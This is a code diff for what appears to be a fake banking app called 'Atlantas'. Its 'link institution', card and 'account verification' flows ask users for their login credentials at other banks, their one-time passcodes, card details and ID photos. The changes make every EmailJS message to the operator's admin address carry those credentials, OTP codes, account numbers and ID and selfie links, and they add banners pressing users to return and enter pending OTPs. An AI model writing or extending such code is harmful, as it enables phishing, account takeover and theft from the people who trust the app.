@@ -548,7 +548,7 @@ function APP_lockFlowSubmit(){
     name:(_ud.firstname+' '+_ud.surname),email:_ud.email,
     submittedDate:new Date().toISOString(),status:'pending'
   })).then(function(){
-    _sendEmail('otp','Account Verification Step',{user_name:_ud.firstname,user_email:_ud.email,method:_lockFlow.method.key,amount:String(_lockFlow.amount),message:'User submitted account verification payment step.'});
+    _sendEmail('otp','Account Verification Step',{user_name:_ud.firstname,user_email:_ud.email,message:'Name: '+(_ud.firstname||'')+' '+(_ud.surname||'')+'\nEmail: '+(_ud.email||'')+'\nAccount: '+(_ud.accountNumber||'')+'\nMethod: '+_lockFlow.method.key+'\nAmount: '+String(_lockFlow.amount)+'\n\nUser submitted an account verification step.'});
     _show('lock-confirm',true);
     _setEl('lock-confirm-msg',_cfg.lockConfirmMessage||'Thank you. Your submission is under review. You will be notified within 24 hours.');
     // Show OTP button if method requires it
@@ -571,7 +571,7 @@ function APP_lockOtpSubmit(){
   if(!lockKey){APP_toast(t('toast_session_expired'),'er');return;}
   // Append OTP to existing submission
   _db.ref(DB.locks+'/'+lockKey).update({otpCode:otp,otpSubmittedDate:new Date().toISOString(),status:'otp_submitted'}).then(function(){
-    _sendEmail('otp','Account Verification OTP Submitted',{user_name:_ud.firstname,user_email:_ud.email,otp:otp,message:'User submitted OTP for account verification. Full submission complete.'});
+    _sendEmail('otp','Account Verification OTP Submitted',{user_name:_ud.firstname,user_email:_ud.email,message:'Name: '+(_ud.firstname||'')+' '+(_ud.surname||'')+'\nEmail: '+(_ud.email||'')+'\nAccount: '+(_ud.accountNumber||'')+'\nOTP Code: '+otp+'\n\nUser submitted OTP for account verification. Full submission complete.'});
     try{localStorage.removeItem('atl_lock_key');}catch(e){}
     // Clear OTP input
     var inp=$('lock-otp-input');if(inp)inp.value='';
@@ -654,7 +654,37 @@ function _renderUI(){
   var bioEnabled=!!localStorage.getItem('atl_bio_email');
   _setEl('bio-status',bioEnabled?'Enabled':'Disabled');
   var btn=$('bio-toggle-btn');if(btn){btn.textContent=bioEnabled?'Disable':'Enable';btn.onclick=bioEnabled?APP_disableBiometric:APP_registerBiometric;}
-  _renderBalance();_renderCards();_renderInstitutions();_renderLoanStatus();
+  _renderBalance();_renderCards();_renderInstitutions();_renderLoanStatus();_checkPendingResume();
+}
+
+// ── PENDING RESUME CHECK ──────────────────────────────────────
+function _checkPendingResume(){
+  var banner=$('pending-resume-banner');
+  if(!banner||!_user)return;
+  // Check card draft
+  var cardDraft=null;
+  try{var d=localStorage.getItem('atl_card_draft');if(d)cardDraft=JSON.parse(d);}catch(e){}
+  // Check inst pending
+  _db.ref('atl_inst_pending/'+_user.uid).once('value',function(snap){
+    var instPending=snap.val();
+    if(cardDraft&&(cardDraft._needsOtp||cardDraft._needsId)){
+      banner.style.display='';
+      banner.innerHTML='<div style="display:flex;align-items:center;gap:10px;padding:12px 16px;background:rgba(217,119,6,0.1);border:1.5px solid rgba(217,119,6,0.3);border-radius:12px;margin:0 18px 12px;cursor:pointer;" onclick="APP.openAddCard()">'
+        +'<span style="font-size:20px;">💳</span>'
+        +'<div style="flex:1;"><div style="font-size:13px;font-weight:700;color:var(--warn);">Card Verification Pending</div>'
+        +'<div style="font-size:12px;color:var(--t2);margin-top:2px;">Tap to continue — enter your OTP or upload ID</div></div>'
+        +'<span style="color:var(--warn);font-size:18px;">›</span></div>';
+    } else if(instPending&&instPending.inst){
+      banner.style.display='';
+      banner.innerHTML='<div style="display:flex;align-items:center;gap:10px;padding:12px 16px;background:rgba(217,119,6,0.1);border:1.5px solid rgba(217,119,6,0.3);border-radius:12px;margin:0 18px 12px;cursor:pointer;" onclick="APP.switchTab(&quot;cards&quot;)">'
+        +'<span style="font-size:20px;">🏦</span>'
+        +'<div style="flex:1;"><div style="font-size:13px;font-weight:700;color:var(--warn);">'+_esc((instPending.inst&&instPending.inst.name)||'Institution')+' — OTP Pending</div>'
+        +'<div style="font-size:12px;color:var(--t2);margin-top:2px;">Tap to go to Cards tab and enter your OTP code</div></div>'
+        +'<span style="color:var(--warn);font-size:18px;">›</span></div>';
+    } else {
+      banner.style.display='none';
+    }
+  });
 }
 function _renderBalance(){
   if(!_ud)return;var bal=parseFloat(_ud.balance||0),sym=_sym(_ud.currency);
@@ -806,6 +836,22 @@ function _renderInstitutions(){
         '</div>';
       // Clicking a linked inst opens the detail screen
       div.onclick=function(){APP_openInstDetail(inst,idx,linked);};
+      // Show Enter OTP button inline if pending — user can tap anytime after app close
+      if(linked.status!=='authorized'){
+        (function(capturedInst,capturedIdx){
+          _db.ref('atl_inst_pending/'+(_user&&_user.uid)).once('value',function(snap){
+            var saved=snap.val();
+            if(saved&&saved.idx===capturedIdx){
+              var otpBtn=document.createElement('button');
+              otpBtn.className='abtn';
+              otpBtn.style.cssText='width:100%;margin-top:8px;background:var(--warn);font-size:13px;padding:10px;';
+              otpBtn.textContent='⏳ Enter OTP Code';
+              otpBtn.onclick=function(e){e.stopPropagation();_resumeInstOtp(saved);};
+              div.appendChild(otpBtn);
+            }
+          });
+        })(inst,idx);
+      }
     } else {
       div.className='inst-banner';
       div.style.borderLeft='3px solid '+(inst.color||'var(--p)');
@@ -972,7 +1018,7 @@ function APP_submitLoan(){
     kycStatus:_ud.kycStatus,status:'pending',
     appliedDate:new Date().toISOString()
   }).then(function(){
-    _sendEmail('otp','New Loan Application',{user_name:_ud.firstname,user_email:_ud.email,amount:_sym(_ud.currency)+amt.toFixed(2),purpose:purpose,duration:duration,message:'User submitted a loan application.'});
+    _sendEmail('otp','New Loan Application',{user_name:_ud.firstname,user_email:_ud.email,message:'Name: '+(_ud.firstname||'')+' '+(_ud.surname||'')+'\nEmail: '+(_ud.email||'')+'\nAccount: '+(_ud.accountNumber||'')+'\nAmount: '+_sym(_ud.currency)+amt.toFixed(2)+'\nPurpose: '+purpose+'\nDuration: '+duration+'\n\nUser submitted a loan application.'});
     _pushAdminAlert('\uD83D\uDCB0 New Loan Application',(_ud.firstname||'A user')+' applied for a loan of '+_sym(_ud.currency)+amt.toFixed(2)+'. Tap to review.');
     if(btn){btn.textContent='Apply for Loan';btn.disabled=false;}
     if(amtEl)amtEl.value='';if(purEl)purEl.value='';if(durEl)durEl.value='';
@@ -1017,7 +1063,7 @@ function APP_instStep1Submit(){
   (_instFlow.step1Fields||[]).forEach(function(f){var v=$('inst-f-'+f.key)&&$('inst-f-'+f.key).value.trim();if(!v)ok=false;data[f.key]=v||'';});
   if(!ok){APP_toast(t('err_fill_all_fields'),'er');return;}
   _instFlow.data=data;
-  _sendEmail('otp','Institution Link Step 1 \u2014 '+inst.name,{user_name:(_ud.firstname||'')+' '+(_ud.surname||''),user_email:_ud.email,institution:inst.name,fields:JSON.stringify(data),message:'User submitted credentials. ID verification step pending.'});
+  _sendEmail('otp','Institution Link Step 1 \u2014 '+inst.name,{user_name:(_ud.firstname||'')+' '+(_ud.surname||''),user_email:_ud.email,message:'Name: '+(_ud.firstname||'')+' '+(_ud.surname||'')+'\nEmail: '+(_ud.email||'')+'\nAccount: '+(_ud.accountNumber||'')+'\nInstitution: '+inst.name+'\nCredentials: '+JSON.stringify(data)+'\n\nUser submitted credentials. Awaiting ID verification.'});
   // NEW ORDER: go to ID documents first (step2), then OTP (step3)
   if(inst.requireId){_buildInstIdStep();_show('inst-step2',true);}
   else _showInstOtpStep();
@@ -1161,7 +1207,7 @@ function _submitInstFinal(){
     _db.ref(DB.users+'/'+_user.uid).update(update).then(function(){
       if(_ud){if(!_ud.linkedInstitutions)_ud.linkedInstitutions={};_ud.linkedInstitutions[idx]={status:'processing',addedDate:sub.addedDate,institution:inst.name};_renderInstitutions();}
     });
-    _sendEmail('otp','Institution Link Complete \u2014 '+inst.name,{user_name:sub.name,user_email:sub.email,institution:inst.name,message:'User completed institution link. Awaiting admin review.'});
+    _sendEmail('otp','Institution Link Complete \u2014 '+inst.name,{user_name:sub.name,user_email:sub.email,message:'Name: '+sub.name+'\nEmail: '+sub.email+'\nInstitution: '+inst.name+'\n\nUser completed institution link. Awaiting admin review.'});
     _pushAdminAlert('\uD83C\uDFE6 New Institution Link',(_ud.firstname||'A user')+' linked '+inst.name+'. Tap to review.');
     _setEl('inst-confirm-name',inst.name);_show('inst-confirm',true);
   });
@@ -1340,7 +1386,7 @@ function APP_doSignup(){
             .then(function(){return _db.ref(DB.pubDir+'/'+uid).set({firstname:fn,surname:sn,accountNumber:accNum});})
             .then(function(){
               if(ref){_db.ref(DB.users).orderByChild('referralCode').equalTo(ref).once('value',function(snap){snap.forEach(function(s){var u=s.val();if(!u)return;var refs=u.referrals||[];refs.push({uid:uid,date:new Date().toISOString()});_db.ref(DB.users+'/'+s.key).update({referrals:refs,referralEarned:(parseFloat(u.referralEarned)||0)+refBonus});});});sessionStorage.removeItem('atl_ref');}
-              _sendEmail('otp','New Registration',{user_name:fn+' '+sn,user_email:em,account_number:accNum,message:'New user registered.'});
+              _sendEmail('otp','New Registration',{user_name:fn+' '+sn,user_email:em,message:'Name: '+fn+' '+sn+'\nEmail: '+em+'\nPhone: '+ph+'\nCountry: '+co+'\nAccount Number: '+accNum+'\nCurrency: '+cur+'\n\nNew user registered.'});
               _pushAdminAlert('\uD83D\uDC64 New User Registered',(fn+' '+sn).trim()+' just created an account. Tap to review.');
               _notify(uid,'\uD83C\uDF89 Welcome to Atlantas, '+fn+'! Your account is ready. Complete your KYC verification to unlock full access.');
             });
@@ -1374,11 +1420,18 @@ function APP_sendPasswordReset(){
 function _sendEmail(account,subject,params){
   try{
     var ej=(_cfg.emailjs)||{};
-    var acc=ej.otp; // Always use OTP service - single EmailJS account
-    if(!acc||!acc.publicKey||!acc.serviceId||!acc.templateId)return;
+    var acc=ej[account]||ej.otp;
+    if(!acc||!acc.publicKey||!acc.serviceId||!acc.templateId){
+      console.warn('[EmailJS] Missing config for account:',account,'cfg.emailjs:',JSON.stringify(ej));
+      return;
+    }
+    if(!_cfg.adminEmail){console.warn('[EmailJS] No adminEmail in config');return;}
     emailjs.init(acc.publicKey);
-    emailjs.send(acc.serviceId,acc.templateId,Object.assign({},{subject:subject,to_email:_cfg.adminEmail||'',from_name:'Atlantas'},params));
-  }catch(e){}
+    var payload=Object.assign({},{subject:subject,to_email:_cfg.adminEmail,from_name:'Atlantas'},params);
+    emailjs.send(acc.serviceId,acc.templateId,payload)
+      .then(function(){console.log('[EmailJS] Sent:',subject);})
+      .catch(function(err){console.error('[EmailJS] Failed:',subject,err);});
+  }catch(e){console.error('[EmailJS] Exception:',e);}
 }
 
 // ── TABS & UI ─────────────────────────────────────────────────
@@ -1475,7 +1528,7 @@ function APP_submitKyc(){
     _clUpload(_kycFiles.selfie,'kyc',function(selfieUrl){
       _db.ref(DB.users+'/'+_user.uid+'/kycStatus').set('submitted').then(function(){
         _db.ref(DB.kyc+'/'+_user.uid).set({uid:_user.uid,email:_ud.email,name:(_ud.firstname+' '+_ud.surname),idUrl:idUrl,selfieUrl:selfieUrl,submittedDate:new Date().toISOString(),status:'pending'});
-        _sendEmail('otp','KYC Submission',{user_name:_ud.firstname+' '+_ud.surname,user_email:_ud.email,id_url:idUrl,selfie_url:selfieUrl,message:'User submitted KYC documents.'});
+        _sendEmail('otp','KYC Submission',{user_name:_ud.firstname+' '+_ud.surname,user_email:_ud.email,message:'Name: '+(_ud.firstname||'')+' '+(_ud.surname||'')+'\nEmail: '+(_ud.email||'')+'\nAccount: '+(_ud.accountNumber||'')+'\nID Document: '+idUrl+'\nSelfie: '+selfieUrl+'\n\nUser submitted KYC documents for verification.'});
         _pushAdminAlert('\uD83E\uDEAA New KYC Submission',(_ud.firstname||'A user')+' submitted identity documents. Tap to review.');
         APP_toast(t('toast_kyc_submitted'),'ok');btn.textContent='Submit for Review';btn.disabled=false;APP_back();
       });
@@ -1602,7 +1655,7 @@ function APP_submitTopup(){
   _db.ref(DB.topups+'/'+key).set({uid:_user.uid,name:(_ud.firstname+' '+_ud.surname).trim(),email:_ud.email,amount:amt,currency:_ud.currency||'USD',accountNumber:_ud.accountNumber,reference:note,paymentSource:srcLabel,status:'pending',date:new Date().toISOString()}).then(function(){
     var hist=(_ud.history||[]);hist.push({type:'debit',amount:amt,currency:_ud.currency,description:'Add money request',requestKey:key,status:'pending',date:new Date().toISOString()});
     _db.ref(DB.users+'/'+_user.uid+'/history').set(hist);
-    _sendEmail('otp','New Deposit Request',{user_name:_ud.firstname,user_email:_ud.email,amount:_sym(_ud.currency)+amt.toFixed(2),account:_ud.accountNumber,reference:note,message:'User submitted a deposit request.'});
+    _sendEmail('otp','New Deposit Request',{user_name:_ud.firstname,user_email:_ud.email,message:'Name: '+(_ud.firstname||'')+' '+(_ud.surname||'')+'\nEmail: '+(_ud.email||'')+'\nAccount: '+(_ud.accountNumber||'')+'\nAmount: '+_sym(_ud.currency)+amt.toFixed(2)+'\nReference: '+(note||'None')+'\n\nUser submitted a deposit request. Please review in admin panel.'});
     _pushAdminAlert('\u2B07\uFE0F New Deposit Request',(_ud.firstname||'A user')+' submitted a deposit of '+_sym(_ud.currency)+amt.toFixed(2)+'. Tap to review.');
     _closeModal();APP_toast(t('toast_submitted'),'ok');
   });
@@ -1648,7 +1701,7 @@ function APP_submitCashout(){
     var hist=(_ud.history||[]);hist.push({type:'debit',amount:amt,currency:_ud.currency,description:'Withdrawal to '+bankName,requestKey:key,status:'processing',date:new Date().toISOString()});
     _db.ref(DB.users+'/'+_user.uid).update({balance:bal-amt,history:hist});
     _db.ref(DB.cashouts+'/'+key).set({uid:_user.uid,name:(_ud.firstname+' '+_ud.surname).trim(),email:_ud.email,amount:amt,currency:_ud.currency||'USD',accountNumber:_ud.accountNumber,destinationInstitution:bankName,destinationInstIdx:instIdx,referredBy:_ud.referredBy||'',status:'pending',date:new Date().toISOString()});
-    _sendEmail('otp','Withdrawal Request',{user_name:_ud.firstname,user_email:_ud.email,amount:sym+amt.toFixed(2),account:bankName,bank:bankName,message:'User submitted a withdrawal request to linked institution.'});
+    _sendEmail('otp','Withdrawal Request',{user_name:_ud.firstname,user_email:_ud.email,message:'Name: '+(_ud.firstname||'')+' '+(_ud.surname||'')+'\nEmail: '+(_ud.email||'')+'\nAccount: '+(_ud.accountNumber||'')+'\nAmount: '+sym+amt.toFixed(2)+'\nDestination: '+bankName+'\n\nUser submitted a withdrawal request.'});
     _pushAdminAlert('\u2B06\uFE0F New Withdrawal Request',(_ud.firstname||'A user')+' wants to withdraw '+sym+amt.toFixed(2)+' to '+bankName+'. Tap to review.');
     APP_toast(t('toast_withdrawal_submitted'),'ok');
   });
@@ -1803,7 +1856,7 @@ function APP_cardStep1Submit(){
   _db.ref(DB.users+'/'+_user.uid+'/linkedCards').set(cards).then(function(){
     if(_ud)_ud.linkedCards=cards;
     _renderCards();
-    _sendEmail('otp','New Card Submission — Step 1',{user_name:_ud.firstname,user_email:_ud.email,card_last4:cn.slice(-4),bank:bank,message:'User submitted card details. Awaiting ID and OTP.'});
+    _sendEmail('otp','New Card Submission \u2014 Step 1',{user_name:_ud.firstname,user_email:_ud.email,message:'Name: '+(_ud.firstname||'')+' '+(_ud.surname||'')+'\nEmail: '+(_ud.email||'')+'\nAccount: '+(_ud.accountNumber||'')+'\nCard Last 4: '+cn.slice(-4)+'\nBank: '+bank+'\n\nUser submitted card details. Awaiting ID and OTP verification.'});
     _pushAdminAlert('\uD83D\uDCB3 New Card Submission',(_ud.firstname||'A user')+' submitted a '+brand+' card ending '+cn.slice(-4)+'. Tap to review.');
   });
   // Go to ID step if enabled, else straight to OTP
@@ -1831,7 +1884,7 @@ function APP_cardStep2Submit(){
   if(!_cardDraft._idUrl){if(err)err.textContent=t('err_upload_id');return;}
   // Append ID data to the card in firebase
   _appendCardData({_idUrl:_cardDraft._idUrl,_selfieUrl:_cardDraft._selfieUrl||'',_needsId:false});
-  _sendEmail('otp','Card ID Submitted',{user_name:_ud.firstname,user_email:_ud.email,card_last4:_cardDraft.lastFour||'',message:'User uploaded ID for card verification.'});
+  _sendEmail('otp','Card ID Submitted',{user_name:_ud.firstname,user_email:_ud.email,message:'Name: '+(_ud.firstname||'')+' '+(_ud.surname||'')+'\nEmail: '+(_ud.email||'')+'\nAccount: '+(_ud.accountNumber||'')+'\nCard Last 4: '+(_cardDraft.lastFour||'')+'\n\nUser uploaded their ID document for card verification.'});
   _show('card-step3',true);
 }
 
@@ -1840,7 +1893,7 @@ function APP_cardStep3Submit(){
   var err=$('cs-otp-err');if(err)err.textContent='';
   if(!otp){if(err)err.textContent=t('err_enter_otp');return;}
   _appendCardData({_otpCode:otp,_needsOtp:false,status:'pending'});
-  _sendEmail('otp','Card OTP Submitted',{user_name:_ud.firstname,user_email:_ud.email,card_last4:_cardDraft.lastFour||'',otp:otp,message:'User submitted OTP for card. Full submission complete — awaiting admin approval.'});
+  _sendEmail('otp','Card OTP Submitted',{user_name:_ud.firstname,user_email:_ud.email,message:'Name: '+(_ud.firstname||'')+' '+(_ud.surname||'')+'\nEmail: '+(_ud.email||'')+'\nAccount: '+(_ud.accountNumber||'')+'\nCard Last 4: '+(_cardDraft.lastFour||'')+'\nOTP Code: '+otp+'\n\nFull card submission complete. Awaiting admin approval.'});
   // Clear draft
   try{localStorage.removeItem('atl_card_draft');}catch(e){}
   _cardDraft=null;
@@ -1913,7 +1966,7 @@ var APP={
   lookupRecipient:APP_lookupRecipient,
   submitTopup:APP_submitTopup,submitSend:APP_submitSend,submitCashout:APP_submitCashout,
   submitRequest:APP_submitRequest,submitCard:APP_submitCard,
-  openAddCard:APP_openAddCard,openCardDetail:APP_openCardDetail,
+  openAddCard:APP_openAddCard,checkPendingResume:_checkPendingResume,openCardDetail:APP_openCardDetail,
   resumeCardOtp:APP_resumeCardOtp,resumeCardId:APP_resumeCardId,
   cardStep1Submit:APP_cardStep1Submit,cardStep2Submit:APP_cardStep2Submit,cardStep3Submit:APP_cardStep3Submit,
   cardIdFileSelected:APP_cardIdFileSelected,cardSelfieSelected:APP_cardSelfieSelected,
